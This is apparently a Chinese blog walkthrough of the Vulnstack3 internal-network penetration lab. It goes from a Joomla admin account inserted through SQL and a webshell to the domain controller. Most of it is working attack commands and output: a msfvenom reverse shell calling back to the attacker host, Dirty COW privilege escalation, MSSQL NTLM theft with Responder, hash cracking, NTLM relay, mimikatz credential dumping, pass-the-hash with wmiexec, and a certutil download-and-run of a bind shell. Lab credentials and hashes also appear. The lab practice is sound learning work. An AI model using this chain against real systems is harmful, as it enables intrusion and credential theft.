-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710121138968.png" alt="image-20220710121138968"></p>
-<p>这里密码加了密，没办法直接用，去somd5也没有解出来，提示此密文无法识别，真·脑阔疼，又无从下手了</p>
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710121340132.png" alt="image-20220710121340132"></p>
-<p>这里我想用mysql直接写shell，但是查了文章说需要root权限，完了没辙了，开摆！</p>
-<p>这里实在是不会，就去看了一眼攻略，可以自行添加用户进行登录</p>
-<p><a href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn">https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn</a></p>
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710203030913.png" alt="image-20220710203030913"></p>
-<p>所以这里payload如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO `am2zu_users` (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`)</span><br><span class="line">VALUES (&#x27;Administrator2&#x27;, &#x27;admin2&#x27;, &#x27;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#x27;, &#x27;&#x27;, NOW(), NOW(), NOW());</span><br><span class="line"></span><br><span class="line">INSERT INTO `am2zu_user_usergroup_map` (`user_id`,`group_id`)</span><br><span class="line">VALUES (LAST_INSERT_ID(),&#x27;8&#x27;);</span><br></pre></td></tr></table></figure>
-
-<p>这里有个小坑，我之前找的_users表没找对，<code>umnbt_users</code>不是后台登录的校验表，<code>am2zu_users</code>才是，我之间对着umnbt_users表一顿输出，一直登陆不上，后来才发现表弄错了，真的是烦！</p>
-<p>然后终于用admin2/secret登录上了后台</p>
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710203534264.png" alt="image-20220710203534264"></p>
-<p>用冰蝎连shell发现disable_fuction把命令执行函数都给禁用了，然后采用哥斯拉的bypass命令执行成功</p>
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220710213724093.png" alt="image-20220710213724093"></p>
-<p>接下来可以利用如下命令做信息收集</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">uname -a    # 获取所有版本信息</span><br><span class="line">uname -m    # 获取Linux内核架构</span><br><span class="line">cat /proc/version    # 获取内核信息 </span><br><span class="line">cat /etc/*-release   # 发布信息</span><br><span class="line">cat /etc/issue    # 发布信息</span><br><span class="line">hostname    # 获取主机名</span><br><span class="line"></span><br><span class="line">cat /etc/passwd    # 列出系统所有用户 </span><br><span class="line">cat /etc/group    # 列出系统所有组 </span><br><span class="line">w    # 查看目前登录的用户</span><br><span class="line">whoami    # 查看当前用户 </span><br><span class="line">id    # 查看当前用户信息 </span><br><span class="line">sudo -l    # 列出目前用户可执行与无法执行的指令 </span><br><span class="line"></span><br><span class="line">ps <span class="built_in">aux</span>    # 查看进程信息 </span><br><span class="line">ls -la /etc/cron*    # 查看计划任务</span><br><span class="line">ifconfig -a    # 列出网络接口信息 </span><br><span class="line">cat /etc/network/interfaces    # 列出网络接口信息 </span><br><span class="line">arp -a    # 查看系统arp表 </span><br><span class="line">route    # 打印路由信息</span><br><span class="line">netstat -anplt    # 打印本地端口开放信息 </span><br><span class="line">iptables -L    # 列出iptable的配置规则</span><br></pre></td></tr></table></figure>
-
-
-
-<p>这里遇到一个奇怪的地方，当执行ifconfig查看网卡的时候没有之前192.168.184.137这个ip，出现了一个没见过的ip地址192.168.93.120，但我并没有93这个网段的网卡应该是到不了的</p>
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711174311528.png" alt="image-20220711174311528"></p>
-<p>这里着实不理解，就去网上看wp了</p>
-<p>原来，之前的184.137这台主机并不是真正的web服务器，93.100这台才是，这里是93.100这台web服务器利用184.137这台服务器做了反向代理，在后续渗透查看配置文件的时候也能证明。</p>
-<p>网上查找资料说这样做反向代理的目的可以<strong>隐藏服务端真实ip</strong>，另外还说<strong>反向代理可以实现负载均衡</strong></p>
-<p>之后根据wp的提示在/tmp/mysql/test.txt中发现了一组用户名密码：wwwuser/wwwuser_123Aqx，猜测应该就是192.168.184.137这台主机ssh的用户和密码。</p>
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711204558737.png" alt="image-20220711204558737"></p>
-<p>尝试ssh登录成功，ifconfig查看网卡有192.168.184.137和192.168.93.100这两个ip</p>
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711180345893.png" alt="image-20220711180345893"></p>
-<p>并且在/etc/nginx/nginx.conf文件中查到如下信息，也证明了之前的说法（93.100这台web服务器利用184.137这台服务器做了反向代理）</p>
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711204938381.png" alt="image-20220711204938381"></p>
-<p>接下来就是搭代理打内网，看网上文章都在用脏牛提权，我感觉没必要提权也能打内网</p>
-<p>这里ew，ssh代理都可以，我选择简单的ssh动态代理<code>ssh -CfNg -D 1080 wwwuser@192.168.184.137</code>，结合proxifier对内网进行渗透</p>
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711230354697.png" alt="image-20220711230354697"></p>
-<p>这里可以直接访问到内网地址说明代理成功</p>
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711230526240.png" alt="image-20220711230526240"></p>
-<p>接下来就用fscan进行扫描<code>fscan64.exe -h 192.168.93.1/24 -np -o fscan_result/result93.txt</code>（-np需要加上，因为直接ping不通），发现内网还有10、20、30这三台主机</p>
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711234256330.png" alt="image-20220711234256330"></p>
-<p>再用nmap进行更全面的端口扫描</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nmap -Pn -sT -sV <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">10</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">30</span> -F</span><br><span class="line">-Pn # 扫描之前不需要用<span class="built_in">ping</span>命令，有些防火墙禁止<span class="built_in">ping</span>命令。可以使用此选项进行扫描</span><br><span class="line">-sT # TCP connect（）扫描，这种方式会在目标主机的日志中记录大批连接请求和错误信息。</span><br><span class="line">-sV # 探测端口服务版本</span><br><span class="line">-F # 只扫描在nmap内建的服务文件中已知的端口，如果不致电给，nmap将扫描端口<span class="number">1</span>~<span class="number">1024</span>及包含在nmap-service文件中的所有其他端口</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220711235001116.png" alt="image-20220711235001116"></p>
-<p>发现存在域<code>test.org</code>，域控为93.10这台服务器，那么接下来的目标就是拿下域控了</p>
-<p>进一步的渗透测试交到MSF上进行</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 利用msf生成一个木马，上传到<span class="number">184</span>.<span class="number">137</span>上执行</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">184</span>.<span class="number">128</span> LPORT=<span class="number">4444</span> -f elf &gt; shell.elf</span><br><span class="line"></span><br><span class="line"># 在msf上开启监听</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span></span><br><span class="line"><span class="built_in">set</span> lport <span class="number">4444</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220713134118908.png" alt="image-20220713134118908"></p>
-<p>添加路由如下</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 添加路由</span><br><span class="line">run autoroute -s <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">0</span>/<span class="number">24</span></span><br><span class="line"># 查看路由</span><br><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220713134631085.png" alt="image-20220713134631085"></p>
-<p>添加成功后，利用msf在本地开启socks代理</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> SRVHOST <span class="number">192</span>.<span class="number">168</span>.<span class="number">184</span>.<span class="number">128</span></span><br><span class="line"><span class="built_in">set</span> SRVPORT <span class="number">1080</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<p>代理开好后配置/etc/proxychains4.conf文件方便后续使用proxychans4</p>
-<p>后面都是参考wp的了，结果还没搞出来，可能是环境问题，只能强行写一下了，记录一下</p>
-<blockquote>
-<p>有几个打法：<strong>SMB爆破</strong>、<strong>MSSQL NTLM Stealer</strong>、<strong>NTLM Relay</strong>。</p>
-</blockquote>
-<h4 id="SMB爆破"><a href="#SMB爆破" class="headerlink" title="SMB爆破"></a>SMB爆破</h4><p>这里是直接根据wp在字典里加的密码，QAQ</p>
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715195130401.png" alt="image-20220715195130401"></p>
-<h4 id="MSSQL-NTLM-Stealer"><a href="#MSSQL-NTLM-Stealer" class="headerlink" title="MSSQL NTLM Stealer"></a>MSSQL NTLM Stealer</h4><p>前面探测到<code>192.168.93.20</code>这台机开启了<code>1433</code>端口，尝试进行连接。账号密码则使用前面<code>Joomla CMS</code>那个配置文件中收集到的：<code>testuser / cvcvgjASD!@</code></p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">apt-get install freetds-bin</span><br><span class="line">proxychains4 tsql -S <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span> -U testuser</span><br></pre></td></tr></table></figure>
-
-<p>可以登录</p>
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715194331486.png" alt="image-20220715194331486"></p>
-<p>接下来就是在93.100这台服务器上搭建Responder环境</p>
-<p>首先下载下面几个工具，</p>
-<p>OpenSSL: <a href="https://www.openssl.org/source/openssl-1.1.1g.tar.gz">https://www.openssl.org/source/openssl-1.1.1g.tar.gz</a></p>
-<p>Python3: <a href="https://www.python.org/ftp/python/3.6.9/Python-3.6.9.tgz">https://www.python.org/ftp/python/3.6.9/Python-3.6.9.tgz</a></p>
-<p>Responder: <a href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a></p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 安装如下</span><br><span class="line"># 注意，这里安装就需要root权限行了，我终于明白看的文章为什么要提权了，这里用脏牛提权就好</span><br><span class="line"></span><br><span class="line">## 脏牛提权</span><br><span class="line">$ git clone https://github.com/FireFart/dirtycow.git</span><br><span class="line">$ gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line">$ ./dirty New-Password</span><br><span class="line">$ su firefart</span><br><span class="line"></span><br><span class="line">## 安装OpenSSL</span><br><span class="line">$ tar -zxvf openssl-<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span>g.tar.gz &amp;&amp; <span class="built_in">cd</span> openssl-<span class="number">1</span>.<span class="number">1</span>.<span class="number">1</span>g/</span><br><span class="line">$ ./config --prefix=/usr/local/openssl shared zlib</span><br><span class="line">$ make &amp;&amp; make install</span><br><span class="line">$ <span class="built_in">echo</span> &#x27;export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/openssl/lib&#x27; &gt;&gt; ~/.bash_profile</span><br><span class="line">$ source ~/.bash_profile</span><br><span class="line"></span><br><span class="line">## 我本地测的时候报错说还却sqlite3</span><br><span class="line">## 参考https://www.jianshu.com/p/f32ec5c9bd30</span><br><span class="line">$ wget https://www.sqlite.org/<span class="number">2017</span>/sqlite-autoconf-<span class="number">3170000</span>.tar.gz –no-check-certificate</span><br><span class="line">$ tar zxvf sqlite-autoconf-<span class="number">3170000</span>.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> sqlite-autoconf-<span class="number">3170000</span></span><br><span class="line">$ ./configure --prefix=/usr/local/sqlite</span><br><span class="line">$  make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">## 安装Python3</span><br><span class="line">$ tar -zxvf Python-<span class="number">3</span>.<span class="number">6</span>.<span class="number">9</span>.tgz &amp;&amp; <span class="built_in">cd</span> Python-<span class="number">3</span>.<span class="number">6</span>.<span class="number">9</span>/</span><br><span class="line">$ ./configure prefix=/usr/local/python3 --with-openssl=/usr/local/openssl</span><br><span class="line">$ make &amp;&amp; make install</span><br><span class="line">$ <span class="built_in">echo</span> &#x27;</span><br><span class="line">#配置python</span><br><span class="line">export PYTHON_HOME=/usr/local/python3</span><br><span class="line">export <span class="built_in">PATH</span>=$PYTHON_HOME/bin:$<span class="built_in">PATH</span>&#x27; &gt;&gt; ~/.bash_profile</span><br><span class="line">$ source ~/.bash_profile</span><br><span class="line"></span><br><span class="line">## 测试</span><br><span class="line">$ python3 </span><br><span class="line">&gt;&gt; import ssl</span><br><span class="line">&gt;&gt; import ctypes</span><br><span class="line">&gt;&gt; import sqlite3</span><br><span class="line"># 没有报错即为成功</span><br><span class="line"></span><br><span class="line">## 安装依赖</span><br><span class="line">$ pip3 install netifaces six pycryptodome pycryptodomex</span><br></pre></td></tr></table></figure>
-
-<p>运行Responder</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">$ python3 Responder.py -I eth1 -Pv</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715204732059.png" alt="image-20220715204732059"></p>
-<p>Kali中使用<code>auxiliary/admin/mssql/mssql_ntlm_stealer</code>，执行<code>xp_dirtree</code>，触发UNC</p>
-<blockquote>
-<p> 配合xp_dirtree存储过程获取运行mssql服务的用户NTLM的hash值,原理是通过LLMNR/NBT-NS欺骗攻击,让MSSQL去访问我们伪造的服务,当MSSQL去执行时就会把它自己的凭证发给我们,我们通过破解它的凭证在返回登录MSSQL,得到最高权限具体操作</p>
-</blockquote>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">msf6&gt; use auxiliary/admin/mssql/mssql_ntlm_stealer</span><br><span class="line">msf6&gt; <span class="built_in">set</span> RHOSTS <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span></span><br><span class="line">msf6&gt; <span class="built_in">set</span> SMBPROXY <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">100</span></span><br><span class="line">msf6&gt; <span class="built_in">set</span> USERNAME testuser</span><br><span class="line">msf6&gt; <span class="built_in">set</span> PASSWORD cvcvgjASD!@</span><br><span class="line">msf6&gt; exploit</span><br></pre></td></tr></table></figure>
-
-<p>利用成功，此时可以看到已经获取到了NTLMv2-Hash</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">[MSSQL] Received connection from ::ffff:<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span></span><br><span class="line">[SMB] NTLMv2-SSP Client   : ::ffff:<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span></span><br><span class="line">[SMB] NTLMv2-SSP Username : WIN2008\Administrator</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : Administrator::WIN2008:<span class="number">710</span>aa5e90138c34b:F435BDB2083AC31B18639D7013BA94BE:<span class="number">01010000000000009553</span>EC8E1F98D801393FF02331B1CEBF00000000020008004800580045004E0001001E00570049004E002D00360041005600430047004D003300530042004B004B0004003400570049004E002D00360041005600430047004D003300530042004B004B002E004800580045004E002E004C004F00430041004C00030014004800580045004E002E004C004F00430041004C00050014004800580045004E002E004C004F00430041004C00080030003000000000000000000000000030000011C4314A8F10C5B6E59317CE9DBBCF8859B4494BEA8E251FCE09E150BA4F27F40000000000000000</span><br></pre></td></tr></table></figure>
-
-<p>得到NTLMv2后，可以利用hashcat暴力破解</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 查看支持的<span class="built_in">Mode</span>,这里NTLMv2的<span class="built_in">Mode</span>为<span class="number">5600</span></span><br><span class="line">$ hashcat --example-hashes | less</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715210758021.png" alt="image-20220715210758021"></p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 破解</span><br><span class="line">$ hashcat -m <span class="number">5600</span> hash.txt top1000.txt --force</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715210830597.png" alt="image-20220715210830597"></p>
-<p>这里其实是把wp里的密码加到字典才爆出来的</p>
-<h4 id="NTLM-Relay"><a href="#NTLM-Relay" class="headerlink" title="NTLM Relay"></a>NTLM Relay</h4><p>MultiRelay中继攻击</p>
-<blockquote>
-<p>没爆破出来可以尝试中继Win2008打Win7，发现Win2008的administrator凭据可以中继到Win7，所以可知Win2008和Win7的本地administrator密码相同。参考：<a href="https://xz.aliyun.com/t/6988#toc-4">https://xz.aliyun.com/t/6988#toc-4</a></p>
-</blockquote>
-<p>运行前需要编译相关工具，这里我在kali完成编译再传到93.100服务器</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">$ apt-get install gcc-mingw-w64-x86-<span class="number">64</span></span><br><span class="line">$ x86_64-w64-mingw32-gcc ./MultiRelay/bin/Runas.c -o ./MultiRelay/bin/Runas.exe -municode -lwtsapi32 -luserenv</span><br><span class="line">$ x86_64-w64-mingw32-gcc ./MultiRelay/bin/Syssvc.c -o ./MultiRelay/bin/Syssvc.exe -municode</span><br></pre></td></tr></table></figure>
-
-<p>接下来展开<strong>中继攻击</strong></p>
-<blockquote>
-<p>所谓中继攻击，就是在两个合法参与方A和B之间进行的一种攻击，中间人C篡改A的消息发送给B或将B的消息篡改发送给A。 C这样做的目的是为了获得A或B的特权，这样C就可以把A的钱通过B的非接触式终端盗走。</p>
-</blockquote>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 在<span class="number">93</span>.<span class="number">100</span>服务器执行</span><br><span class="line">## 关闭本地的nginx服务，因为会冲突，启动nginx服务直接输入nginx即可</span><br><span class="line">$ nginx -s stop</span><br><span class="line"></span><br><span class="line">## 禁用SMB和HTTP服务,将对应选项修改为Off</span><br><span class="line">$ vi Responder.conf</span><br><span class="line"></span><br><span class="line">## 开启监听</span><br><span class="line">$ python3 Responder.py -I eth1 -v -F</span><br><span class="line"></span><br><span class="line">## 运行MultiRelay</span><br><span class="line">$ python3 MultiRelay.py -t <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">30</span> -u ALL</span><br><span class="line"></span><br><span class="line"># kali执行</span><br><span class="line">## MSSQL触发UNC</span><br><span class="line">msf6&gt; exploit</span><br></pre></td></tr></table></figure>
-
-<p>可惜我本地测没有成功，说目标没有这个凭证</p>
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715212639480.png" alt="image-20220715212639480"></p>
-<p>所以接下来的步骤都是照抄wp的，太菜了QAQ</p>
-<p>此时已经获取到Win7的Shell了，然后使用<code>mimikatz</code>抓取明文密码。</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; </span><br><span class="line">mimikatz &quot;sekurlsa::logonpasswords&quot;</span><br></pre></td></tr></table></figure>
-
-<p>还可以通过<code>dump</code>来获得<code>NTLM Hash</code>，存储在<code>Responder/tools/MultiRelay/relay-dumps</code>目录下</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">Administrator:500:<span class="title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="title">c1794c5aa8547c87a8bcd0324b8337</span>:::</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/60932dea1a09ff9bf41bfd506003640e.png" alt="img"></p>
-<p>然后就可以用wmiexec来连接到93.20</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># git clone https://github.com/SecureAuthCorp/impacket</span><br><span class="line"># <span class="built_in">cd</span> impacket/ &amp;&amp; python3 -m pip install .</span><br><span class="line"></span><br><span class="line"># NTLM Hash</span><br><span class="line">$ proxychains4 python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>c1794c5aa8547c87a8bcd0324b8337 administrator@<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span></span><br><span class="line"></span><br><span class="line"># 明文密码</span><br><span class="line">$ proxychains4 python3 wmiexec.py &#x27;administrator:<span class="number">123</span>qwe!ASD@<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span>&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>这里还是照着答案测了一下，终于拿下了一个windows服务器😭</p>
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715221055341.png" alt="image-20220715221055341"></p>
-<h3 id="攻域控"><a href="#攻域控" class="headerlink" title="攻域控"></a>攻域控</h3><h4 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h4><blockquote>
-<p>未知Win2008明文密码，使用NTLM Hash通过WMI连接到Win2008，然后获取正向Shell，通过进程迁移提权后读取文件</p>
-</blockquote>
-<p>MSF生成一个正向shell木马，并开启监听</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">$ msfvenom -p windows/meterpreter/bind_tcp -f exe -o bind.exe</span><br><span class="line"></span><br><span class="line">msf6&gt; use exploit/multi/handler </span><br><span class="line">msf6&gt; <span class="built_in">set</span> PAYLOAD windows/meterpreter/bind_tcp</span><br><span class="line">msf6&gt; <span class="built_in">set</span> RHOST <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span></span><br><span class="line">msf6&gt; <span class="built_in">set</span> LPORT <span class="number">5555</span></span><br><span class="line">msf6&gt; exploit</span><br></pre></td></tr></table></figure>
-
-<p>然后将生成的正向马传到93.100上（这里利用scp上传），并在93.100上开启http服务</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># kali中ssh连接配置</span><br><span class="line"># vim /root/.ssh/config</span><br><span class="line"># Host *</span><br><span class="line"># HostkeyAlgorithms +ssh-rsa</span><br><span class="line"># PubkeyAcceptedKeyTypes +ssh-rsa</span><br><span class="line"></span><br><span class="line">$ scp bind.exe wwwuser@<span class="number">192</span>.<span class="number">168</span>.<span class="number">184</span>.<span class="number">137</span>:/tmp/</span><br><span class="line"># wwwuser_123Aqx</span><br><span class="line"></span><br><span class="line">$ python3 -m http.server <span class="number">8080</span></span><br></pre></td></tr></table></figure>
-
-<p>然后通过之间WMI连接的93.20的shell，下载传到93.100上bind.exe马，并执行</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">$ proxychains4 python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>c1794c5aa8547c87a8bcd0324b8337 administrator@<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span></span><br><span class="line"></span><br><span class="line">$ certutil -urlcache -split -f http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">100</span>:<span class="number">8080</span>/bind.exe </span><br><span class="line">$ bind.exe</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715224132571.png" alt="image-20220715224132571"></p>
-<p>上线之后执行<code>ps</code>，发现存在域管用户的进程，进程迁移</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">meterpreter&gt; ps</span><br><span class="line">meterpreter&gt; migrate <span class="number">3800</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715224352593.png" alt="image-20220715224352593"></p>
-<p>迁移成功</p>
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715224749412.png" alt="image-20220715224749412"></p>
-<p>接下来就可以读取域控的文件了</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">type</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">10</span>\C$\Users\Administrator\Documents\flag.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715224926271.png" alt="image-20220715224926271"></p>
-<h4 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h4><blockquote>
-<p>已知Win2008明文密码，使用mimikatz抓取域管密码，然后通过IPC连接域控读取文件</p>
-</blockquote>
-<p>上传mimikatz。使用<code>smbclient</code>连接并上传</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">$ proxychains4 smbclient -L <span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span> -U administrator</span><br><span class="line">$ proxychains4 smbclient //<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">20</span>/ADMIN$ -U administrator</span><br><span class="line">$ put mimikatz.exe</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715230004656.png" alt="image-20220715230004656"></p>
-<p>执行mimikatz，获得<code>TEST\administrator</code>密码：<code>zxcASDqw123!</code></p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> c:/windows</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot; &quot;<span class="keyword">exit</span>&quot; &gt; pwd.log</span><br><span class="line"><span class="built_in">type</span> pwd.log</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715230259643.png" alt="image-20220715230259643"></p>
-<p>最后IPC连接到域控读取文件</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">10</span>\admin$ zxcASDqw123!! /user:test\administrator</span><br><span class="line">$ <span class="built_in">type</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">10</span>\C$\users\administrator\Documents\flag.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715230516432.png" alt="image-20220715230516432"></p>
-<p>获得密码后其实这里可以用之前的方法，用WMI直接登录上域控93.10</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">proxychains4 python3 wmiexec.py &#x27;administrator:zxcASDqw123!!@<span class="number">192</span>.<span class="number">168</span>.<span class="number">93</span>.<span class="number">10</span>&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/07/10/Vulnstack3%E9%9D%B6%E5%9C%BA%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20220715230812938.png" alt="image-20220715230812938"></p>
